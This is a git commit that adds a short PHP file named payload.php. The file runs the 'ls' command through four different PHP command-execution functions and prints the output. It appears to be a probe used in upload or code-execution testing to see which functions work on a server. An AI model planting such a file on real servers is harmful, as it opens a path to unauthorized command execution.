d5b1712629e1ab4a9c4d85f52ca5eee5aca8ed33
Amirhossein Zendevani <103830306+amirzand81@users.noreply.github.com>
2025-04-05 22:56:16 +0330

    Create payload.php

---
+++ payload.php
@@ -0,0 +1,11 @@
+<?php
+  echo "<pre>";
+  passthru("ls");
+  echo "<pre>";
+  shell_exec("ls");
+  echo "<pre>";
+  exec("ls", $out); print_r($out);
+  echo "<pre>";
+  `ls`; 
+  echo "</pre>";
+?>
